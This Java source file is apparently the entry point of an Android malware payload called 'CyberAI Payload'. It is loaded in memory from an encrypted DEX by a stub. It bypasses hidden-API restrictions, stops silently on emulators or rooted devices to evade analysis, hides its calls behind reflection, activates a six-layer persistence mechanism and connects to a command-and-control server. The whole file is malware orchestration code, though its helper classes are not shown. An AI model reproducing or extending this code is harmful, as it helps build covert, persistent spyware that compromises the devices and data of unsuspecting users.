package com.payload;

import android.content.Context;
import android.util.Log;

import com.payload.core.EnvironmentProber;
import com.payload.core.HiddenApiBypass;
import com.payload.core.Reflector;
import com.payload.persist.PersistenceMatrix;
import com.payload.comms.ChannelClient;

/**
 * CyberAI Payload — Entry Point
 *
 * Called by the stub's DexLoader after loading this class from memory.
 * This is the first code that runs from the encrypted, in-memory DEX.
 *
 * Execution order:
 *   1. Initialize HiddenApiBypass — unlock all restricted APIs
 *   2. Probe environment — detect Android version, OEM, root, emulator
 *   3. Initialize Reflector — all API calls go through reflection
 *   4. Activate persistence matrix — 6-layer watchdog
 *   5. Start C2 communication — connect to server
 *   6. Signal readiness
 */
public class EntryPoint {

    private static final String TAG = "CyberAI-Payload";
    private static Context appContext = null;

    /**
     * Called by the stub after loading this DEX in memory.
     * This is the single entry point.
     */
    public static void init(Context context) {
        appContext = context.getApplicationContext();
        Log.i(TAG, "Payload initializing...");

        try {
            // Step 1: Bypass hidden API restrictions
            // This single call unlocks EVERY restricted API in Android
            HiddenApiBypass.unlockAll();
            Log.i(TAG, "Hidden API bypass enabled");

            // Step 2: Probe environment
            EnvironmentProber prober = new EnvironmentProber(context);
            prober.probe();
            Log.i(TAG, "Environment probed: API=" + prober.getApiLevel()
                + " OEM=" + prober.getManufacturer()
                + " Emulator=" + prober.isEmulator()
                + " Rooted=" + prober.isRooted());

            // If running on emulator or root, exit silently
            if (prober.isEmulator() || prober.isRooted()) {
                Log.w(TAG, "Running in analysis environment — shutting down");
                return;
            }

            // Step 3: Initialize the reflection engine
            // All subsequent API calls use this instead of direct imports
            Reflector.init(context);
            Log.i(TAG, "Reflector initialized");

            // Step 4: Initialize the persistence matrix
            // This activates all 6 persistence layers
            PersistenceMatrix persistence = new PersistenceMatrix(context);
            persistence.activate();
            Log.i(TAG, "Persistence matrix activated");

            // Step 5: Start C2 communication
            ChannelClient channelClient = new ChannelClient(context);
            channelClient.connect();
            Log.i(TAG, "C2 channels initialized");

            Log.i(TAG, "Payload initialization complete");

        } catch (Exception e) {
            Log.e(TAG, "Payload initialization failed: " + e.getMessage(), e);

            // Retry once after 5 seconds
            try {
                Thread.sleep(5000);
                init(context);
            } catch (InterruptedException ignored) {}
        }
    }

    public static Context getContext() {
        return appContext;
    }
}
